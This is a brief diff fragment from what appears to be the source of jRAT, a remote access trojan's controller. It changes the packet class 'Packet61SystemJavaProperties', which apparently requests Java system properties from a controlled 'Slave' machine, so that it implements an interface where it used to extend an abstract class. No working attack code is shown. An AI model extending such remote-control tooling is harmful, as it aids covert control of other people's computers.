@@ -3,7 +3,7 @@ package jrat.controller.packets.outgoing;
 import jrat.controller.Slave;
 
 
-public class Packet61SystemJavaProperties extends AbstractOutgoingPacket {
+public class Packet61SystemJavaProperties implements OutgoingPacket {
 
 	@Override
 	public void write(Slave slave) throws Exception {
